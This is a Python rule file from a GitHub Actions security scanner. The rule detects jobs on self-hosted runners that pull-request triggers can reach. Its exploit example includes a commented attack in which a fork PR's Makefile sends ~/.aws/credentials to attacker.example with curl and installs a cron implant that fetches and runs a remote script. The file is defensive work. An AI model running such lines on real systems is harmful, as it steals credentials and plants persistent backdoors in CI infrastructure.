"""GHA-105. Self-hosted runner reachable from an untrusted PR trigger.

GitHub-hosted runners are fresh, throwaway VMs: a fork PR that runs on
one executes in an isolated sandbox that's destroyed afterward.
Self-hosted runners are the opposite. They're long-lived machines the
org owns, often with cached credentials, network reach into internal
systems, and state that survives between jobs. GitHub's own docs warn,
in bold, against using self-hosted runners with public repositories
for exactly this reason.

When a workflow triggered by ``pull_request`` (fork-capable on a
public repo) or ``pull_request_target`` schedules a job on a
self-hosted runner, any external contributor's PR runs arbitrary code
on that persistent infrastructure. The classic outcomes: exfiltrate
the runner's cached cloud credentials, pivot into the internal network
the runner sits in, or drop a persistent implant that backdoors every
later job the runner services.

This complements GHA-012 (self-hosted runner not ephemeral, the
state-leak angle) and GHA-036 (``runs-on`` interpolates an untrusted
expression, the targeting angle). GHA-105 is about the trigger reaching
the runner at all.
"""
from __future__ import annotations

from typing import Any

from ...base import Finding, Severity
from ...rule import Rule
from ..base import iter_jobs, job_location, workflow_triggers

#: PR triggers that can carry code (or a privileged context) from an
#: external contributor. ``pull_request`` is fork-capable on public
#: repos; ``pull_request_target`` runs in the base repo's privileged
#: context regardless.
_UNTRUSTED_PR_TRIGGERS = frozenset({"pull_request", "pull_request_target"})

RULE = Rule(
    id="GHA-105",
    title="Self-hosted runner reachable from an untrusted PR trigger",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4", "CICD-SEC-7"),
    esf=("ESF-D-BUILD-ENV", "ESF-D-PRIV-BUILD"),
    cwe=("CWE-94",),  # Improper Control of Generation of Code
    recommendation=(
        "Don't run fork / pull-request code on self-hosted runners. "
        "Validate PRs on ephemeral GitHub-hosted runners "
        "(`runs-on: ubuntu-latest`); reserve self-hosted runners for "
        "`push` / `workflow_dispatch` jobs on trusted refs. If a "
        "self-hosted runner is unavoidable on a PR (a private repo "
        "with no external forks), gate the job behind a job-level "
        "`if:` that checks the actor or author association "
        "(`github.event.pull_request.author_association == "
        "'OWNER'`), require manual approval via a protected "
        "`environment:`, and run the runner with `--ephemeral` so it "
        "can't carry state or an implant into the next job (GHA-012)."
    ),
    docs_note=(
        "Fires when a workflow's `on:` includes `pull_request` or "
        "`pull_request_target` AND at least one job's `runs-on:` names "
        "a self-hosted runner. Recognizes all three `runs-on` shapes: "
        "the bare `self-hosted` string, a list that contains "
        "`self-hosted` (`[self-hosted, linux, x64]`), and the "
        "long-form `{ group, labels }` dict (a `group:` selector is "
        "always a self-hosted runner group; a `labels:` list is "
        "matched for `self-hosted`). A `runs-on:` that resolves to a "
        "GitHub-hosted image, or to a `${{ }}` expression the scanner "
        "can't resolve, is not flagged here."
    ),
    known_fp=(
        "A private repository with no external forks, where every PR "
        "comes from a trusted internal branch, carries less risk: the "
        "code reaching the runner is already trusted. The check can't "
        "tell public from private, so it fires regardless. Suppress "
        "per-job via the ignore-file once the team has confirmed the "
        "repo is private and fork PRs can't run. Defaults to MEDIUM "
        "confidence for this reason.",
    ),
    incident_refs=(
        "GitHub docs, Self-hosted runner security: "
        "https://docs.github.com/en/actions/hosting-your-own-runners/"
        "managing-self-hosted-runners/about-self-hosted-runners"
        "#self-hosted-runner-security "
        "(\"we recommend that you only use self-hosted runners with "
        "private repositories\").",
        "PostHog disclosure (2024): a fork PR on a self-hosted runner "
        "let researchers run code on internal CI infrastructure and "
        "reach production credentials.",
    ),
    exploit_example=(
        "# Vulnerable: a fork PR runs on the org's self-hosted runner.\n"
        "name: ci\n"
        "on:\n"
        "  pull_request:            # fork-capable on a public repo\n"
        "    branches: [main]\n"
        "jobs:\n"
        "  test:\n"
        "    runs-on: [self-hosted, linux, x64]\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>   # checks out PR head\n"
        "      - run: make test                 # runs PR-head Makefile\n"
        "\n"
        "# Attack: an external contributor opens a fork PR whose\n"
        "# Makefile exfiltrates the runner's cached credentials and\n"
        "# drops a cron implant:\n"
        "#\n"
        "#   test:\n"
        "#   \tcat ~/.aws/credentials | curl -d @- https://attacker.example\n"
        "#   \t(crontab -l; echo '* * * * * curl https://attacker.example/x|sh') | crontab -\n"
        "#\n"
        "# The runner is a long-lived box the org owns, so the implant\n"
        "# now backdoors every later job it services, and the AWS keys\n"
        "# it cached are live.\n"
        "\n"
        "# Safe: validate PRs on an ephemeral GitHub-hosted runner;\n"
        "# the self-hosted fleet only runs trusted push jobs.\n"
        "name: ci\n"
        "on:\n"
        "  pull_request: { branches: [main] }\n"
        "jobs:\n"
        "  test:\n"
        "    runs-on: ubuntu-latest          # throwaway sandbox VM\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "      - run: make test"
    ),
)


def _runs_on_self_hosted(runs_on: Any) -> bool:
    """True when a job's ``runs-on:`` targets a self-hosted runner.

    Matches the bare ``self-hosted`` string, a list containing it, or
    the long-form dict (a ``group:`` is always a self-hosted runner
    group; a ``labels:`` field is matched for ``self-hosted``).
    """
    def _is_token(value: Any) -> bool:
        return isinstance(value, str) and value.strip().lower() == "self-hosted"

    if isinstance(runs_on, str):
        return _is_token(runs_on)
    if isinstance(runs_on, list):
        return any(_is_token(v) for v in runs_on)
    if isinstance(runs_on, dict):
        if "group" in runs_on:
            return True
        labels = runs_on.get("labels")
        if isinstance(labels, str):
            return _is_token(labels)
        if isinstance(labels, list):
            return any(_is_token(v) for v in labels)
    return False


def check(path: str, doc: dict[str, Any]) -> Finding:
    triggers = set(workflow_triggers(doc))
    pr_triggers = sorted(triggers & _UNTRUSTED_PR_TRIGGERS)
    if not pr_triggers:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description=(
                "Workflow is not triggered by pull_request / "
                "pull_request_target."
            ),
            recommendation="No action required.", passed=True,
        )

    offending: list[str] = []
    locations = []
    for job_id, job in iter_jobs(doc):
        if _runs_on_self_hosted(job.get("runs-on")):
            offending.append(job_id)
            locations.append(job_location(path, job))

    passed = not offending
    desc = (
        "No self-hosted job is reachable from a pull-request trigger."
        if passed else
        f"{len(offending)} job(s) run on a self-hosted runner under a "
        f"`{', '.join(pr_triggers)}` trigger: {', '.join(offending)}. "
        f"An external contributor's PR executes arbitrary code on "
        f"persistent infrastructure the org owns, exposing cached "
        f"credentials, the internal network, and every later job the "
        f"runner services."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
        # Self-hosted-job anchors so the chain engine can intersect
        # them with impact-side findings on the same job.
        job_anchors=tuple(offending),
    )
